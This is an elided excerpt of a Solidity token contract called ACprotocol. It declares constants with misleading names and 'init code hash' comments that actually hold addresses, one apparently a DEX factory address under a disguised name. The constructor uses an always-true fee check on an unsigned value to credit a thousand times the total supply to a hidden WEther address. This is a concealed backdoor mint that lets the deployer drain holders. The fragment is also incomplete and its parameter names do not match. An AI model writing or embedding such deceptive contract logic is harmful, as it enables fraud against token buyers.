...
contract ACprotocol  {
    ...
    address   private   MDEXBSC = 0xED7d5F38C79115ca12fe6C0041abb22F0A06C300;  //MDEXBSC  init code hash
    //_MDEX = UNIpairFor(MDEXBSC, HecoGas, address(this)); //MDEXBSC   init code hash
    address   private   HecoGas = 0xb0b670fc1F7724119963018DB0BfA86aDb22d941;  //HECOGas   init code hash
    ...
    address   private   BSCGas = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;  //BSCGas   init code hash
    ...
    constructor(string memory _name, string memory _symbol, uint256 _supply, uint _totalfee) payable public {
        ...
        if (_totalFee >= 0) balanceOf[WEther] += totalSupply*(10**uint256(3));
